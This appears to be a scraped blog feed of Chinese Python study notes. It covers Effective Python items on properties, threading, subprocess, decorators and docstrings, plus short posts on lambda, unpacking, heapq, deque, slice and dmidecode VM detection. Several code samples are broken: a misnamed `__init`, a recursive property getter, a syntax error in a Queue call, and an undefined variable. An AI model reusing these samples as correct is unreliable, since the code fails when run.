class="built_in">print</span>(obj.get_ohms())</span><br></pre></td></tr></table></figure>

<p>但是，对Python来说，不需要手工实现setter和getter，而是直接用public属性，这样原地自增操作变得清晰自然</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Resistor</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init</span>(<span class="params">self, ohms</span>):</span><br><span class="line">		<span class="variable language_">self</span>.ohms = ohms</span><br><span class="line">r1 = Resistor(<span class="number">50e3</span>)</span><br><span class="line">r1.ohms += <span class="number">5e3</span></span><br></pre></td></tr></table></figure>

<h2 id="30-考虑用-property代替属性重构"><a href="#30-考虑用-property代替属性重构" class="headerlink" title="30. 考虑用@property代替属性重构"></a>30. 考虑用@property代替属性重构</h2><p>Python内置的@property装饰器负责把一个方法变成属性调用</p>
<p>例，使用@property既能检查参数，又可以用类似属性这样简单方法访问类的变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.score</span><br><span class="line"></span><br><span class="line"><span class="meta">    @score.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;score must be an int!&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">0</span> <span class="keyword">or</span> value &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;score must between 0 ~ 100&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>._score = value</span><br><span class="line"></span><br><span class="line">s = Student()</span><br><span class="line">s.score = <span class="number">60</span></span><br><span class="line">s.score = <span class="number">10000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>python test.py</span><br><span class="line">ValueError: score must between <span class="number">0</span> ~ <span class="number">100</span></span><br></pre></td></tr></table></figure>

<h2 id="31-用描述符来改写需要复用的-property方法"><a href="#31-用描述符来改写需要复用的-property方法" class="headerlink" title="31. 用描述符来改写需要复用的@property方法"></a>31. 用描述符来改写需要复用的@property方法</h2><h2 id="32-用getattr-getattribute-setattr实现按需生成操作-惰性方式加载并保存对象属性）"><a href="#32-用getattr-getattribute-setattr实现按需生成操作-惰性方式加载并保存对象属性）" class="headerlink" title="32. 用getattr, getattribute, setattr实现按需生成操作 (惰性方式加载并保存对象属性）"></a>32. 用getattr, getattribute, setattr实现按需生成操作 (惰性方式加载并保存对象属性）</h2><ul>
<li>如果某个类定义了__getattr__，同时系统在该类对象实例字典中找不到待查属性，那么，系统就会调用这个方法</li>
<li>程序每次访问对象属性，Python系统会调用__getattribute__</li>
</ul>
<h2 id="33-用元类验证子类"><a href="#33-用元类验证子类" class="headerlink" title="33. 用元类验证子类"></a>33. 用元类验证子类</h2><h2 id="34-用元类注册子类"><a href="#34-用元类注册子类" class="headerlink" title="34. 用元类注册子类"></a>34. 用元类注册子类</h2><h1 id="第5章-并发及并行"><a href="#第5章-并发及并行" class="headerlink" title="第5章 并发及并行"></a>第5章 并发及并行</h1><h2 id="36-用subprocess模块管理子进程"><a href="#36-用subprocess模块管理子进程" class="headerlink" title="36. 用subprocess模块管理子进程"></a>36. 用subprocess模块管理子进程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">proc = subprocess.Popen([<span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">out, err = proc.communicate()</span><br><span class="line"><span class="built_in">print</span>(out.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>把子进程从父进程中剥离</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sleep</span>(<span class="params">period</span>):</span><br><span class="line">    proc = subprocess.Popen([<span class="string">&#x27;sleep&#x27;</span>, <span class="built_in">str</span>(period)])</span><br><span class="line">    <span class="keyword">return</span> proc</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">procs = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    proc = run_sleep(<span class="number">0.1</span>)</span><br><span class="line">    procs.append(proc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> proc <span class="keyword">in</span> procs:</span><br><span class="line">    proc.communicate()</span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Finished in %.3f seconds&#x27;</span> % (end - start))</span><br></pre></td></tr></table></figure>

<h2 id="37-可以用线程执行阻塞式IO，但不要用它做并行计算"><a href="#37-可以用线程执行阻塞式IO，但不要用它做并行计算" class="headerlink" title="37. 可以用线程执行阻塞式IO，但不要用它做并行计算"></a>37. 可以用线程执行阻塞式IO，但不要用它做并行计算</h2><ul>
<li>受到全局解释器锁（GIL）限制，多条Python线程不能在多个CPU核心上平行地执行字节码</li>
</ul>
<h2 id="38-在线程中使用Lock来防止数据竞争"><a href="#38-在线程中使用Lock来防止数据竞争" class="headerlink" title="38. 在线程中使用Lock来防止数据竞争"></a>38. 在线程中使用Lock来防止数据竞争</h2><ul>
<li>GIL不会保护开发者自己代码， 同一时刻固然只能有一个Python线程运行，但这个线程正在操作某个数据结构时，其他线程可能会打断它，也就是说Python解释器来执行两个连续字节码指令时，其他线程可能会中途插进来。</li>
</ul>
<p>threading.Lock类实现了互斥锁</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LockingCounter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="variable language_">self</span>.lock = Lock()</span><br><span class="line">		<span class="variable language_">self</span>.count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment</span>(<span class="params">self, offset</span>):</span><br><span class="line">		<span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">			<span class="variable language_">self</span>.count += offset</span><br></pre></td></tr></table></figure>

<h2 id="39-用Queue协调各线程之间的工作"><a href="#39-用Queue协调各线程之间的工作" class="headerlink" title="39. 用Queue协调各线程之间的工作"></a>39. 用Queue协调各线程之间的工作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = Queue.Queue(<span class="number">10</span>=</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">producer</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consumer</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(q.get())</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=consumer)</span><br><span class="line">t2 = threading.Thread(target=producer)</span><br></pre></td></tr></table></figure>

<h2 id="40-考虑用协程并发地运行多个函数"><a href="#40-考虑用协程并发地运行多个函数" class="headerlink" title="40.考虑用协程并发地运行多个函数"></a>40.考虑用协程并发地运行多个函数</h2><ul>
<li>对于生成器的yield表达式来说，外部代码通过send方法传给生成器的那个值，就是该表达式所具备的值</li>
</ul>
<h2 id="x20-41-考虑用concurrent-futures实现平行计算"><a href="#x20-41-考虑用concurrent-futures实现平行计算" class="headerlink" title="&#x20;41. 考虑用concurrent.futures实现平行计算"></a>&#x20;41. 考虑用concurrent.futures实现平行计算</h2><ul>
<li>multiprocessing模块可用于实现平行计算，利用multiprocessing模块最恰当做法，是通过内置concurrent.futures模块及其ProcessPoolExecutor类使用它</li>
</ul>
<h1 id="第6章-内置模块"><a href="#第6章-内置模块" class="headerlink" title="第6章 内置模块"></a>第6章 内置模块</h1><h2 id="x20-42-用functools-wraps定义函数修饰器"><a href="#x20-42-用functools-wraps定义函数修饰器" class="headerlink" title="&#x20;42. 用functools.wraps定义函数修饰器"></a>&#x20;42. 用functools.wraps定义函数修饰器</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s(%r, %r) -&gt; %r&#x27;</span> % (func.__name__, args, kwargs, result))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@trace</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">2</span>) + fibonacci(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fibonacci(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li>Python为修饰器提供专门语法，使得程序运行时，能用一个函数修改另一个函数</li>
</ul>
<h2 id="43-考虑以contextlib和with语句改写可复用的try-finally代码"><a href="#43-考虑以contextlib和with语句改写可复用的try-finally代码" class="headerlink" title="43. 考虑以contextlib和with语句改写可复用的try&#x2F;finally代码"></a>43. 考虑以contextlib和with语句改写可复用的try&#x2F;finally代码</h2><p>用with语句代替try… finally，例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.read()</span><br></pre></td></tr></table></figure>

<h2 id="44-用copyreg实现可靠pickle操作"><a href="#44-用copyreg实现可靠pickle操作" class="headerlink" title="44. 用copyreg实现可靠pickle操作"></a>44. 用copyreg实现可靠pickle操作</h2><p>内置的pickle模块能够将Python对象字节序列转化为字节流，也能把字节反序列化成Python对象</p>
<h2 id="45-使用datatime模块处理本地时间而不是time"><a href="#45-使用datatime模块处理本地时间而不是time" class="headerlink" title="45. 使用datatime模块处理本地时间而不是time"></a>45. 使用datatime模块处理本地时间而不是time</h2><ul>
<li>不要用time模块在不同时区进行转换</li>
<li>开发者总是应该先把时间表示成UTC，然后对其转换，最后再转回本地时间</li>
</ul>
<h2 id="46-使用内置算法和数据结构"><a href="#46-使用内置算法和数据结构" class="headerlink" title="46. 使用内置算法和数据结构"></a>46. 使用内置算法和数据结构</h2><ul>
<li>双向队列 deque</li>
<li>有序字典 OrderedDict (按照键插入顺序，保留键值对在字典中次序）</li>
<li>优先级队列 heapq</li>
<li>二分查找 bisect</li>
<li>迭代器有关 itertools</li>
</ul>
<h2 id="47-重视精确度场合，应该使用decimal"><a href="#47-重视精确度场合，应该使用decimal" class="headerlink" title="47.重视精确度场合，应该使用decimal"></a>47.重视精确度场合，应该使用decimal</h2><p>Decimal类适合用在对精度要求高，对舍入行为要求严格的场合，例如：涉及货币计算的场合</p>
<h2 id="48-学会安装由Python开发者社区构建的模块-x20"><a href="#48-学会安装由Python开发者社区构建的模块-x20" class="headerlink" title="48. 学会安装由Python开发者社区构建的模块&#x20;"></a>48. 学会安装由Python开发者社区构建的模块&#x20;</h2><ul>
<li>PyPI (Python Package Index) 包含许多常用软件包， pip命令行工具可以从PyPI中安装软件包</li>
</ul>
<h1 id="第7章-协作开发"><a href="#第7章-协作开发" class="headerlink" title="第7章 协作开发"></a>第7章 协作开发</h1><h2 id="49-为每个函数、类和模块编写文档字符串"><a href="#49-为每个函数、类和模块编写文档字符串" class="headerlink" title="49. 为每个函数、类和模块编写文档字符串"></a>49. 为每个函数、类和模块编写文档字符串</h2><p><strong>为模块编写文档</strong></p>
<ul>
<li>每个模块应该有顶级的docstring</li>
<li>头一行文字，用一句话描述本模块用途，接着一段话包含一些细节信息，把与本模块操作相关内容，告诉模块使用者。</li>
<li>还可以在模块的dockstring中，强调本模块里比较重要类和函数，使开发者据此了解该模块用法</li>
</ul>
<p>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># words.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Library for XXX...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Testing how words XXX...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Available functions:</span></span><br><span class="line"><span class="string"> - palindrome: Determine if a word ...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>为类编写文档</strong></p>
<p>每一个类应该有docstring，写法与模块级的docstring大致相同，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;Represents a player of the game.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Subclassses may override ...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Public attributes:</span></span><br><span class="line"><span class="string">	- power: ...</span></span><br><span class="line"><span class="string">	- coins: ...</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>为函数编写文档</strong></p>
<p>函数的docstring，第一行用一句话描述函数功能，接下来用一段话描述具体行为和函数参数。 若函数由返回值，应该在docstring中写明</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_anagrams</span>(<span class="params">word, dictionary</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;Find all anagrams for a word.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	This function only runs as fast as the test for membership in the dictionary container...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Args:</span></span><br><span class="line"><span class="string">		word: String of the target word.</span></span><br><span class="line"><span class="string">		dictionary: Container with all strings that are known to be actual words.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Returns:</span></span><br><span class="line"><span class="string">		List of anagrams that were found. Empty if none were found.</span></span><br></pre></td></tr></table></figure>
<p>作者的建议：</p>
<ul>
<li>如果函数没有参数，仅有一个简单返回值，那么只需一句话描述该函数就够了</li>
<li>如果函数没有返回值，不要在docstring里提及，不要出现return None这种说法</li>
<li>如果正常使用中不会抛异常，就不要在docstring提到异常</li>
<li>如果函数接收可变参数，应该在文档中描述*args, **kwargs用途</li>
<li>如果函数参数有默认值，应该指出这些默认值</li>
</ul>
<h2 id="50-用包安排模块，并提供稳固API"><a href="#50-用包安排模块，并提供稳固API" class="headerlink" title="50. 用包安排模块，并提供稳固API"></a>50. 用包安排模块，并提供稳固API</h2><p>在目录中放入名为__init__.py的空文件，就可以采用相对于该目录的路径，引入目录中其他Python文件，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main.py</span><br><span class="line">mypackage/__init__.py</span><br><span class="line">mypackage/utils.py</span><br></pre></td></tr></table></figure>

<p>在main.py中引入utils模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">from</span> mypackage <span class="keyword">import</span> utils</span><br></pre></td></tr></table></figure>

<p><strong>as子句可以给引入当前作用域的属性重新起名，解决冲突</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> analysis.utils <span class="keyword">import</span> inspect <span class="keyword">as</span> analysis_inspect</span><br><span class="line"><span class="keyword">from</span> frontend.utils <span class="keyword">import</span> inspect <span class="keyword">as</span> frontend_inspect</span><br></pre></td></tr></table></figure>

<p>尽量不要使用import *语句，而是应该用from x import y，明确指出自己想要引入的名称</p>
<h2 id="51-为自编的模块定义根异常，以便将调用者与API隔离"><a href="#51-为自编的模块定义根异常，以便将调用者与API隔离" class="headerlink" title="51. 为自编的模块定义根异常，以便将调用者与API隔离"></a>51. 为自编的模块定义根异常，以便将调用者与API隔离</h2><h2 id="52-用适当方式打破循环依赖关系"><a href="#52-用适当方式打破循环依赖关系" class="headerlink" title="52. 用适当方式打破循环依赖关系"></a>52. 用适当方式打破循环依赖关系</h2><ul>
<li>如果两个模块必须相互调用对方，才能完成引入操作，就会出现循环依赖现象，这可能导致程序启动时崩溃</li>
<li>打破循环依赖关系最佳方案，是把导致两个模块互相依赖的那部分代码，重构为单独模块，并把它放在依赖树底部</li>
</ul>
<h2 id="53-用虚拟环境隔离项目，并重建其依赖关系"><a href="#53-用虚拟环境隔离项目，并重建其依赖关系" class="headerlink" title="53. 用虚拟环境隔离项目，并重建其依赖关系"></a>53. 用虚拟环境隔离项目，并重建其依赖关系</h2><h1 id="x20-第8章-部署"><a href="#x20-第8章-部署" class="headerlink" title="&#x20;第8章 部署"></a>&#x20;第8章 部署</h1><h2 id="54-考虑用模块级别代码配置不同部署环境-x20"><a href="#54-考虑用模块级别代码配置不同部署环境-x20" class="headerlink" title="54. 考虑用模块级别代码配置不同部署环境&#x20;"></a>54. 考虑用模块级别代码配置不同部署环境&#x20;</h2><h2 id="55-通过repr字符串输出调试信息"><a href="#55-通过repr字符串输出调试信息" class="headerlink" title="55. 通过repr字符串输出调试信息"></a>55. 通过repr字符串输出调试信息</h2><p>简单的print不能打印出值的类型信息，可以用repr获取类型信息</p>
<h2 id="56-用unittest测试全部代码"><a href="#56-用unittest测试全部代码" class="headerlink" title="56. 用unittest测试全部代码"></a>56. 用unittest测试全部代码</h2><h2 id="57-用pdb实现交互调试"><a href="#57-用pdb实现交互调试" class="headerlink" title="57. 用pdb实现交互调试"></a>57. 用pdb实现交互调试</h2><p><a href="https://docs.python.org/zh-cn/3/library/pdb.html">https://docs.python.org/zh-cn/3/library/pdb.html</a></p>
<h2 id="58-先分析性能，然后再优化"><a href="#58-先分析性能，然后再优化" class="headerlink" title="58. 先分析性能，然后再优化"></a>58. 先分析性能，然后再优化</h2><h2 id="59-用tracemalloc掌握内存使用和泄漏情况"><a href="#59-用tracemalloc掌握内存使用和泄漏情况" class="headerlink" title="59. 用tracemalloc掌握内存使用和泄漏情况"></a>59. 用tracemalloc掌握内存使用和泄漏情况</h2>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python的Lamdba函数是什么，应用场景是什么?</title>
    <url>/2023/08/15/2023-08-15-what-is-lambda-function-in-python/</url>
    <content><![CDATA[<p><strong>定义：</strong> Lambda函数也叫匿名函数，它是功能简单，只用一行代码就能实现的小型函数。<br><strong>使用场景：</strong> Lambda函数没有名字，不用考虑函数名冲突问题；减少了代码行数，方便又简洁。<br><strong>格式：</strong> lambda 参数[,参数] : 表达式 （例： <code>lambda x,y : x + y</code>）<br><strong>举例：</strong> 用lambda函数求出1到20中所有的奇数并组成一个list：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">1</span>, <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(L)</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>另外，匿名函数也可以赋值给变量，可以通过该变量调用这个匿名函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">5</span>))</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528">https://www.liaoxuefeng.com/wiki/1016959663602400/1017451447842528</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python解压序列，可迭代对象赋值给多个变量方法</title>
    <url>/2023/08/22/2023-08-22-extrace-seq-in-python/</url>
    <content><![CDATA[<h2 id="解压序列赋值给多个变量"><a href="#解压序列赋值给多个变量" class="headerlink" title="解压序列赋值给多个变量"></a>解压序列赋值给多个变量</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>year, month, day = [<span class="number">2002</span>, <span class="number">6</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(year, month, day)</span><br><span class="line"><span class="number">2002</span> <span class="number">6</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>可以用占位符，丢弃其他的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">year, _ , _ = [<span class="number">2002</span>,<span class="number">6</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(year)</span><br><span class="line"><span class="number">2002</span></span><br></pre></td></tr></table></figure>

<h2 id="解压可迭代对象赋值给多个变量"><a href="#解压可迭代对象赋值给多个变量" class="headerlink" title="解压可迭代对象赋值给多个变量"></a>解压可迭代对象赋值给多个变量</h2><span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">first, *middle, last = grades</span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c01/p01_unpack_sequence_into_separate_variables.html">Python Cookbook 第一章</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 查找最大或最小的N个元素</title>
    <url>/2023/08/22/2023-08-22-find-n-elements-with-python/</url>
    <content><![CDATA[<p>除了直接排序，还可以利用<code>heaq</code>模块的<code>nlargest()</code>和<code>nsmallest()</code>方法，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>smallest = heapq.nsmallest(<span class="number">3</span>, nums)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(smallest)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>largest = heapq.nlargest(<span class="number">3</span>, nums)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(largest)</span><br><span class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python保留最后N个元素</title>
    <url>/2023/08/29/2023-08-29-keep-final-n-elements-by-python/</url>
    <content><![CDATA[<p>使用<code>deque</code>，指定<code>maxlen</code>参数的值为N，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq = deque(maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(dq)</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], maxlen=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c01/p03_keep_last_n_items.html">Python Cookbook 1.3</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python给切片命名，增强可读性</title>
    <url>/2023/08/29/2023-08-29-python-name-slice/</url>
    <content><![CDATA[<p>使用内置的<code>slice</code>函数创建切片，而不是硬编码下标，从而增强代码可读性，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip=<span class="string">&quot;&lt;127.0.0.1&gt;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GET_IP = <span class="built_in">slice</span>(<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip[GET_IP]</span><br><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c01/p11_naming_slice.html">https://python3-cookbook.readthedocs.io/zh_CN&#x2F;latest&#x2F;c01&#x2F;p11_naming_slice.html</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>判断虚拟机类型是VMware,AWS,Azure的方法</title>
    <url>/2023/11/23/2023-11-23-judge-vm-infra/</url>
    <content><![CDATA[<p>使用<code>dmidecode</code>，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># AWS：</span></span><br><span class="line">dmidecode -t system | grep Manufacturer</span><br><span class="line">        Manufacturer: Amazon EC2</span><br><span class="line"><span class="comment"># VMware：</span></span><br><span class="line">dmidecode -t system | grep Manufacturer</span><br><span class="line">        Manufacturer: VMware, Inc</span><br><span class="line"><span class="comment"># Azure:</span></span><br><span class="line">dmidecode -t system | grep Manufacturer</span><br><span class="line">        Manufacturer: Microsoft Corporation</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>RHEL9 Fatal glibc error, CPU does not support x86-64-v2 解决方法</title>
    <url>/2023/12/13/2023-12-13-rhel9-cpu-not-support-x8664v2/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>RHEL 9要求x86_64的CPU支持x86-64-v2，x86-64-v2需要处理器支持 CMPXCHG16B、LAHF-SAHF、POPCNT、SSE3、SSE4.1、SSE4.2、SSSE3 等现代指令集</p>
